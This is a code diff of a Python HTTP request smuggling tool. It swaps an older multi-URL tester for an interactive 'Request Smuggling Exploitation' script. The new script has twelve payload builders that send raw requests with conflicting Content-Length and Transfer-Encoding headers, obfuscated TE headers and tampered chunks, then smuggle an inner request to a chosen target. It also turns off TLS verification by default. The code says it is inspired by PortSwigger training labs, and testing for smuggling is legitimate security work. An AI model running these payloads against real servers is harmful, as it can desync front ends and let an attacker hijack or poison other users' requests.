@@ -1,431 +1,345 @@
 #!/usr/bin/env python3
-"""
-Smuggling Attacker
-Automated HTTP request smuggling workflow inspired by PortSwigger labs.
-
-Features:
-- Accepts list of URLs pasted from BurpSuite (deduplicates base paths).
-- Variants tested:
-    * Content-Length = 5 with appended "0"
-    * Content-Length = 0
-    * No Content-Length
-    * Only Transfer-Encoding: chunked
-    * Both Content-Length and Transfer-Encoding
-    * Neither Content-Length nor Transfer-Encoding
-    * Classic TE.CL, TE.TE
-- Method support: GET or POST, optional body for POST.
-- Auth support: None / Bearer token / Cookie.
-- Always sets Connection: keep-alive.
-- Sequential execution with verbose progress.
-- Flags success only when duplicate responses are seen (dup_signals >= 2).
-- Prints successful attempts immediately in green with request/response.
-- Consolidated summary of successful vs unsuccessful attempts at the end.
-- Graceful Ctrl+C handling: shows results obtained so far.
-"""
-
-import sys
+import argparse
 import socket
 import ssl
+import subprocess
+import os
 from urllib.parse import urlparse
+from datetime import datetime
 from colorama import Fore, Style, init
-# Proxy configuration (set during interactive workflow)
-use_proxy = False
-proxy_host = None
-proxy_port = None
-
 
 init(autoreset=True)
 
-# ---------------------------
-# Networking helpers
-# ---------------------------
-def parse_url(target):
-    target = target.strip()
+# ------------------------------
+# Utilities
+# ------------------------------
 
-    # Auto-add scheme if missing
-    if "://" not in target:
-        target = "http://" + target
+def make_inner_request(method: str, path: str, host_header: str) -> str:
+    # Inner duplicated request with proper CRLF termination
+    # Example:
+    # GET /search.php?test=query HTTP/1.1\r\n
+    # Host: testphp.vulnweb.com\r\n
+    # \r\n
+    return f"{method} {path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
 
-    p = urlparse(target)
+def ensure_host_header(host: str) -> str:
+    # Host header must be hostname (no scheme, no path)
+    return host
 
-    scheme = p.scheme or "http"
-    host = p.hostname
-    port = p.port or (443 if scheme == "https" else 80)
-    path = p.path or "/"
-    if p.query:
-        path = f"{path}?{p.query}"
-
-    return scheme, host, port, path
-
-def test_variant(name, builder, host, port, path, use_tls, method, headers, body, url):
-
-    # Add inner smuggling request
-    inner = build_inner_request(host)
-    if body:
-        body = body + inner
-    else:
-        body = inner
-
-
-def connect(host, port, use_tls=False):
-
-    global use_proxy, proxy_host, proxy_port
-    print(f"[DEBUG] Connecting to {host}:{port} | TLS={use_tls} | proxy={use_proxy}")
-
-
-    # ---------- PROXY MODE ----------
-    if use_proxy:
-        # 1) Connect to proxy
-        s = socket.create_connection((proxy_host, proxy_port), timeout=10)
-
-        # If HTTPS, we MUST first send a CONNECT request
-        if use_tls:
-            connect_req = (
-                f"CONNECT {host}:{port} HTTP/1.1\r\n"
-                f"Host: {host}:{port}\r\n"
-                f"Connection: keep-alive\r\n"
-                f"\r\n"
-            )
-            s.sendall(connect_req.encode("ascii"))
-
-            # Read proxy reply
-            resp = s.recv(4096).decode("latin-1", errors="replace")
-            if "200" not in resp:
-                raise Exception(f"Proxy CONNECT failed: {resp}")
-
-            # Now wrap TLS over the tunnel
-            ctx = ssl.create_default_context()
-            ctx.set_alpn_protocols(["h2", "http/1.1"])
-            s = ctx.wrap_socket(s, server_hostname=host)
-
-        # If HTTP, we just send the raw request through proxy
-        return s
-
-    # ---------- DIRECT MODE ----------
-    s = socket.create_connection((host, port), timeout=10)
-    if use_tls:
-        ctx = ssl.create_default_context()
-        ctx.set_alpn_protocols(["h2", "http/1.1"])
-        s = ctx.wrap_socket(s, server_hostname=host)
-    return s
-
-
-def recv_all(sock):
-    sock.settimeout(10)
-    data = b""
+def recv_all(sock, timeout=4):
+    sock.settimeout(timeout)
+    chunks = []
     try:
         while True:
-            chunk = sock.recv(4096)
-            if not chunk:
+            data = sock.recv(4096)
+            if not data:
                 break
-            data += chunk
+            chunks.append(data)
     except socket.timeout:
         pass
-    return data
+    return b"".join(chunks)
 
-def send_raw_request(host, port, use_tls, raw):
-    s = connect(host, port, use_tls)
-    try:
-        s.sendall(raw.encode("latin-1"))
-        data = recv_all(s)
-        alpn = None
-        if use_tls and hasattr(s, "selected_alpn_protocol"):
-            alpn = s.selected_alpn_protocol()
-        return data, alpn
-    finally:
-        s.close()
-
-# ---------------------------
-# Request builders
-# ---------------------------
-
-def build_request(host, path, method, headers, body, extra_headers, use_tls):
-
-    global use_proxy
-
-    # Build the correct request-line depending on proxy mode + TLS
-    if use_proxy and not use_tls:
-        # HTTP over proxy → requires absolute URL
-        request_line = f"{method} http://{host}{path} HTTP/1.1"
+def dial(host: str, port: int, use_tls: bool, cafile: str | None, disable_verify: bool):
+    raw = socket.create_connection((host, port), timeout=8)
+    if not use_tls:
+        return raw
+    # TLS wrapper
+    if disable_verify:
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
     else:
-        # HTTPS over proxy (after CONNECT) or direct-to-server → normal request-line
-        request_line = f"{method} {path} HTTP/1.1"
+        ctx = ssl.create_default_context(cafile=cafile) if cafile else ssl.create_default_context()
+    return ctx.wrap_socket(raw, server_hostname=host)
 
-    request = [request_line, f"Host: {host}", "Connection: keep-alive"]
+def send_raw(connect_host, connect_port, payload_bytes, use_tls=False, cafile=None, disable_verify=True):
+    s = dial(connect_host, connect_port, use_tls, cafile, disable_verify)
+    s.sendall(payload_bytes)
+    resp = recv_all(s)
+    s.close()
+    return resp
 
+def classify_response(resp_bytes: bytes) -> str:
+    text = resp_bytes.decode(errors="ignore")
+    # Basic heuristics
+    if "HTTP/1.1 2" in text or "HTTP/1.0 2" in text:
+        return "Successful"
+    if "HTTP/1.1 3" in text:
+        return "Interesting"
+    if "HTTP/1.1 4" in text or "HTTP/1.1 5" in text:
+        return "Failed"
+    # Burp landing page or proxied messages can be interesting
+    if "Burp Suite" in text:
+        return "Interesting"
+    return "Interesting" if text else "Failed"
 
-    for k, v in headers.items():
-        request.append(f"{k}: {v}")
-    for k, v in extra_headers.items():
-        request.append(f"{k}: {v}")
-    request.append("")  # end headers
-    if body:
-        request.append(body)
-    raw = "\r\n".join(request) + "\r\n"
-    return raw
+# ------------------------------
+# Payload builders (PortSwigger techniques)
+# Each returns bytes
+# ------------------------------
 
-def build_inner_request(host):
+def build_cl_te_mismatch(host_header, inner_req, path="/"):
+    # TE present but body ends with chunked terminator, then inner request
     return (
-        f"GET / HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"\r\n"
-    )
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Content-Length: 4\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
+def build_te_cl_reverse(host_header, inner_req, path="/"):
+    # Chunked body declares a chunk but CL smaller; common desync variant
+    # One small chunk then end, followed by inner request
+    body = "1\r\nX\r\n0\r\n\r\n"
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Content-Length: 5\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        f"{body}"
+    ).encode() + inner_req.encode()
 
-def build_cl5(host, path, method, headers, body, use_tls):
-    b = (body or "") + "0"
-    return build_request(host, path, method, headers, b, {"Content-Length": str(len(b))}, use_tls)
+def build_duplicate_cl(host_header, inner_req, path="/"):
+    # Two Content-Length headers; origin vs front-end disagreement
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Content-Length: 4\r\n"
+        "Content-Length: 100\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "TEST\r\n"
+        "\r\n"
+    ).encode() + inner_req.encode()
 
-def build_cl0(host, path, method, headers, body, use_tls):
-    return build_request(host, path, method, headers, body, {"Content-Length": "0"}, use_tls)
+def build_embedded_direct(host_header, inner_req, path="/"):
+    # Body is exactly the inner request with correct length
+    body = inner_req
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        f"{body}"
+    ).encode()
 
-def build_no_cl(host, path, method, headers, body, use_tls):
-    return build_request(host, path, method, headers, body, {}, use_tls)
+def build_te_obfuscated(host_header, inner_req, path="/"):
+    # Obfuscate TE header
+    # Transfer-Encoding: chunked with case/space/semicolon variations
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding:    chunked\r\n"
+        "Transfer-Encoding: chunked;foo=bar\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
-def build_te_only(host, path, method, headers, body, use_tls):
-    return build_request(host, path, method, headers, body, {"Transfer-Encoding": "chunked"}, use_tls)
+def build_lf_termination(host_header, inner_req, path="/"):
+    # Use lone LF in body delimiting to trigger parser quirks
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\n\n"
+    ).encode() + inner_req.encode()
 
-def build_cl_te(host, path, method, headers, body, use_tls):
-    cl = str(len(body or ""))
-    return build_request(host, path, method, headers, body, {
-        "Content-Length": cl,
-        "Transfer-Encoding": "chunked"
-    }, use_tls)
+def build_space_in_method(host_header, inner_req_path, path="/"):
+    # Leading space in method line of inner request
+    inner = f"GET {inner_req_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
+    inner = " " + inner  # prepend space to try method-line obfuscation
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        f"Content-Length: {len(inner)}\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        f"{inner}"
+    ).encode()
 
-def build_no_headers(host, path, method, headers, body, use_tls):
-    return build_request(host, path, method, headers, body, {}, use_tls)
+def build_header_folding(host_header, inner_req, path="/"):
+    # Obsolete header folding (line wrapping) to confuse parsers
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding:\tchunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
-def build_te_cl(host, path, method, headers, body, use_tls):
-    cl = str(len(body or ""))
-    return build_request(host, path, method, headers, body, {
-        "Transfer-Encoding": "chunked",
-        "Content-Length": cl
-    }, use_tls)
+def build_duplicate_te(host_header, inner_req, path="/"):
+    # Two TE headers, one valid, one invalid, to cause disagreement
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Transfer-Encoding: identity\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
-def build_te_te(host, path, method, headers, body, use_tls):
-    return build_request(host, path, method, headers, body, {
-        "Transfer-Encoding": "chunked",
-        "Transfer-Encoding": "chunked"
-    }, use_tls)
+def build_chunk_size_tamper(host_header, inner_req, path="/"):
+    # Tamper chunk size with hex vs decimal confusion
+    body = "A\r\nXXXXXXXXXX\r\n0\r\n\r\n"  # 10 bytes chunk in hex
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        f"{body}"
+    ).encode() + inner_req.encode()
 
+def build_te_uppercase(host_header, inner_req, path="/"):
+    # Case variance in TE header
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "Transfer-Encoding: CHUNKED\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
-# ---------------------------
-# Detection heuristics
-# ---------------------------
+def build_crlf_in_header(host_header, inner_req, path="/"):
+    # Try CRLF injection in header values (some proxies mishandle)
+    return (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        "X-Header: value\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        "0\r\n\r\n"
+    ).encode() + inner_req.encode()
 
-def summarize_response(resp_bytes):
-    text = resp_bytes.decode("latin-1", errors="replace")
-    head, _, body = text.partition("\r\n\r\n")
-    status_line = head.splitlines()[0] if head else ""
-    dup_signals = sum(1 for line in text.splitlines() if line.startswith("HTTP/1.1 "))
-    snippet = body[:300].replace("\r", " ").replace("\n", " ")
-    return status_line, dup_signals, snippet
+# ------------------------------
+# Suite runner
+# ------------------------------
 
-# ---------------------------
-# Worker
-# ---------------------------
+TECHNIQUES = [
+    ("CL_TE mismatch", build_cl_te_mismatch),
+    ("TE_CL reverse", build_te_cl_reverse),
+    ("Duplicate Content-Length", build_duplicate_cl),
+    ("Embedded direct", build_embedded_direct),
+    ("Obfuscated TE", build_te_obfuscated),
+    ("LF termination", build_lf_termination),
+    ("Space in inner method", build_space_in_method),
+    ("Header folding (obsolete)", build_header_folding),
+    ("Duplicate Transfer-Encoding", build_duplicate_te),
+    ("Chunk size tamper (hex)", build_chunk_size_tamper),
+    ("TE uppercase", build_te_uppercase),
+    ("CRLF in header value", build_crlf_in_header),
+]
 
-def test_variant(name, builder, host, port, path, use_tls, method, headers, body, url):
-    raw = builder(host, path, method, headers, body, use_tls)
-    try:
-        resp_bytes, alpn = send_raw_request(host, port, use_tls, raw)
-        status_line, dup_signals, snippet = summarize_response(resp_bytes)
-        is_success = dup_signals >= 2
-        response_text = resp_bytes.decode("latin-1", errors="replace")[:1000]
-        return {
-            "url": url,
-            "variant": name,
-            "request": raw,
-            "response": response_text,
-            "status_line": status_line,
-            "success": is_success
-        }
-    except Exception as e:
-        return {
-            "url": url,
-            "variant": name,
-            "request": raw,
-            "response": f"Error: {e}",
-            "status_line": "",
-            "success": False
-        }
+def run_suite(connect_host, connect_port, target_host_header, scheme, inner_method, inner_path, cafile, disable_verify):
+    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running request smuggling suite ===" + Style.RESET_ALL)
+    use_tls = (scheme == "https")
 
-# ---------------------------
-# Interactive workflow
-# ---------------------------
+    results = {"Successful": [], "Interesting": [], "Failed": []}
 
-def run_interactive():
-    print("=== Smuggling Attacker ===")
-    print("Paste your list of URLs (from BurpSuite: Right-click → Copy all URLs).")
-    print("End input with an empty line.\n")
+    for name, builder in TECHNIQUES:
+        try:
+            if builder == build_space_in_method:
+                payload = builder(target_host_header, inner_path)  # path string for inner method variant
+            else:
+                inner = make_inner_request(inner_method, inner_path, target_host_header)
+                payload = builder(target_host_header, inner)
+            # Show payload preview
+            print(Fore.YELLOW + f"\n--- Technique: {name} ---" + Style.RESET_ALL)
+            print(payload.decode(errors="ignore"))
 
-    urls = []
-    while True:
-        line = input()
-        if not line.strip():
-            break
-        urls.append(line.strip())
+            resp = send_raw(connect_host, connect_port, payload, use_tls=use_tls, cafile=cafile, disable_verify=disable_verify)
+            cls = classify_response(resp)
+            results[cls].append(name)
 
-    if not urls:
-        print("No URLs provided. Exiting.")
-        sys.exit(1)
+            # Print response head
+            print(Fore.CYAN + "\n=== Response (first 800 bytes) ===" + Style.RESET_ALL)
+            print(resp[:800].decode(errors="ignore"))
+        except Exception as e:
+            print(Fore.RED + f"[!] Error during {name}: {e}" + Style.RESET_ALL)
+            results["Failed"].append(name)
 
-    unique_urls = {}
-    for u in urls:
-        scheme, host, port, path = parse_url(u)
-        base = f"{scheme}://{host}:{port}{path}"
-        if base not in unique_urls:
-            unique_urls[base] = u
+    # Summary
+    print(Fore.BLUE + Style.BRIGHT + "\n=== Smuggling Summary ===" + Style.RESET_ALL)
+    for group in ["Successful", "Interesting", "Failed"]:
+        items = results[group]
+        print(f"{Fore.GREEN if group=='Successful' else (Fore.YELLOW if group=='Interesting' else Fore.RED)}{group}:{Style.RESET_ALL}")
+        if not items:
+            print("  - None")
+        else:
+            for i in items:
+                print(f"  - {i}")
 
-    print(f"\n[+] {len(urls)} URLs provided, reduced to {len(unique_urls)} unique base paths.\n")
+    print(Fore.CYAN + f"\nCompleted at {datetime.now().isoformat(timespec='seconds')}" + Style.RESET_ALL)
 
-    method = input("Choose method [GET/POST]: ").strip().upper()
-    body = ""
-    if method == "POST":
-        print("Enter POST body (end with empty line):")
-        lines = []
-        while True:
-            line = sys.stdin.readline()
-            if not line or not line.strip():
-                break
-            lines.append(line.rstrip("\n"))
-        body = "\n".join(lines)
+# ------------------------------
+# Interactive CLI
+# ------------------------------
 
-    print("\nDo you need authentication headers?")
-    print("1. No authentication")
-    print("2. Bearer token")
-    print("3. Cookie")
-    auth_choice = input("Enter choice number: ").strip()
+def main():
+    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Request Smuggling Exploitation ===\n" + Style.RESET_ALL)
 
-    user_headers = {}
-    if auth_choice == "2":
-        token = input("Enter Bearer token: ").strip()
-        user_headers["Authorization"] = f"Bearer {token}"
-    elif auth_choice == "3":
-        cookie = input("Enter Cookie string: ").strip()
-        user_headers["Cookie"] = cookie
+    target_url = input("Target URL (e.g. https://www.example.com/): ").strip()
+    parsed = urlparse(target_url if "://" in target_url else ("https://" + target_url))
+    scheme = parsed.scheme.lower()
+    host = parsed.hostname or ""
+    port = parsed.port or (443 if scheme == "https" else 80)
+    base_path = parsed.path or "/"
 
-    print("\nOptional: add extra headers (e.g., Content-Type: application/json). End with empty line.")
-    while True:
-        hline = input().strip()
-        if not hline:
-            break
-        if ":" in hline:
-            k, v = hline.split(":", 1)
-            user_headers[k.strip()] = v.strip()
+    host_header = ensure_host_header(host)
+    print(f"\nTarget parsed → Scheme: {scheme} | Host: {host_header} | Port: {port} | Base path: {base_path}")
 
+    inner_method = input("Inner request method [default GET]: ").strip().upper() or "GET"
+    inner_path = input(f"Inner request path [default {base_path}]: ").strip() or base_path
 
-    print("\nDo you want to route requests through a BurpSuite proxy?")
-    print("1. No (direct)")
-    print("2. Yes (BurpSuite on 127.0.0.1:8080 or custom)")
-    pchoice = input("Enter choice number: ").strip()
-
-    global use_proxy, proxy_host, proxy_port
-
-    if pchoice == "2":
-        use_proxy = True
-        host_input = input("Proxy host [default 127.0.0.1]: ").strip() or "127.0.0.1"
-        port_input = input("Proxy port [default 8080]: ").strip() or "8080"
-        proxy_host = host_input
-        proxy_port = int(port_input)
-        print(f"[+] Using BurpSuite proxy at {proxy_host}:{proxy_port}")
+    proxy = input("Proxy for interception (ip:port) [blank = none]: ").strip()
+    if proxy:
+        try:
+            connect_host, connect_port = proxy.split(":")
+            connect_port = int(connect_port)
+            print(f"[+] Using proxy {connect_host}:{connect_port} for TCP connect")
+        except Exception:
+            print(Fore.RED + "[!] Invalid proxy format. Use ip:port (e.g., 127.0.0.1:8080)" + Style.RESET_ALL)
+            return
     else:
-        use_proxy = False
-        print("[+] Direct connection mode enabled (no proxy).")
+        connect_host, connect_port = host, port
+        print("[+] No proxy; connecting directly to origin")
 
+    print("\nTLS trust options:")
+    print("  1) Disable verification (easiest with Burp interception)")
+    print("  2) Provide CA file (burp_ca.crt) for proper trust")
+    trust_opt = input("Select [1/2, default 1]: ").strip() or "1"
+    disable_verify = True
+    cafile = None
+    if trust_opt == "2":
+        cafile = input("Path to CA file (e.g., burp_ca.crt): ").strip()
+        disable_verify = False
 
-    print("\n[+] Starting request smuggling tests sequentially...\n")
+    # --- Run suite(s) ---
+    if scheme == "https":
+        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTPS suite ===" + Style.RESET_ALL)
+        run_suite(connect_host, connect_port, host_header, "https",
+                  inner_method, inner_path, cafile, disable_verify)
 
-    variants = {
-        "CL=5 with appended 0": build_cl5,
-        "CL=0": build_cl0,
-        "No Content-Length": build_no_cl,
-        "TE only": build_te_only,
-        "CL+TE": build_cl_te,
-        "No headers": build_no_headers,
-        "TE.CL": build_te_cl,
-        "TE.TE": build_te_te,
-    }
-
-    affected = []
-   
-
-    failed = []
-
-    try:
-        for base, representative_url in unique_urls.items():
-            scheme, host, port, path = parse_url(representative_url)
-            use_tls = (scheme == "https")
-
-            print(f"\n[+] Testing target: {representative_url}")
-
-            for name, builder in variants.items():
-                print(f"    -> Variant: {name}")
-                result = test_variant(
-                    name, builder,
-                    host, port, path, use_tls,
-                    method, user_headers, body,
-                    representative_url
-                )
-
-                if result["success"]:
-                    affected.append(result)
-                    print(f"\n{Fore.GREEN}Target: {result['url']} ({result['variant']}){Style.RESET_ALL}")
-                    print("=== Request Sent ===")
-                    print(result["request"])
-                    print("=== Response Received ===")
-                    print(result["response"])
-                else:
-                    failed.append(result)
-
-            # If HTTPS, also try HTTP downgrade on port 80
-            if use_tls:
-                print("    -> Testing HTTP downgrade")
-                for name, builder in variants.items():
-                    result = test_variant(
-                        f"{name} (HTTP downgrade)", builder,
-                        host, 80, path, False,
-                        method, user_headers, body,
-                        f"http://{host}{path}"
-                    )
-                    if result["success"]:
-                        affected.append(result)
-                        print(f"\n{Fore.GREEN}Target: {result['url']} ({result['variant']}){Style.RESET_ALL}")
-                        print("=== Request Sent ===")
-                        print(result["request"])
-                        print("=== Response Received ===")
-                        print(result["response"])
-                    else:
-                        failed.append(result)
-
-    except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[!] Interrupted by user. Showing results obtained so far...{Style.RESET_ALL}")
-
-    # Consolidated summary
-    print("\n=== Summary ===\n")
-    print(f"{Fore.GREEN}Successful Smuggling Attempts:{Style.RESET_ALL}")
-    if affected:
-        seen = set()
-        for r in affected:
-            key = (r["url"], r["variant"])
-            if key in seen:
-                continue
-            seen.add(key)
-            print(f"  - {r['url']} ({r['variant']})")
+        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTP suite ===" + Style.RESET_ALL)
+        # Force HTTP run on port 80
+        run_suite(connect_host, 80, host_header, "http",
+                  inner_method, inner_path, cafile, True)
     else:
-        print("  - None")
-
-    print(f"\n{Fore.RED}No Smuggling Detected:{Style.RESET_ALL}")
-    if failed:
-        seenf = set()
-        for r in failed:
-            key = (r["url"], r["variant"])
-            if key in seenf:
-                continue
-            seenf.add(key)
-            print(f"  - {r['url']} ({r['variant']})")
-    else:
-        print("  - None")
+        run_suite(connect_host, connect_port, host_header, "http",
+                  inner_method, inner_path, cafile, True)
 
 if __name__ == "__main__":
-    run_interactive()
+    main()
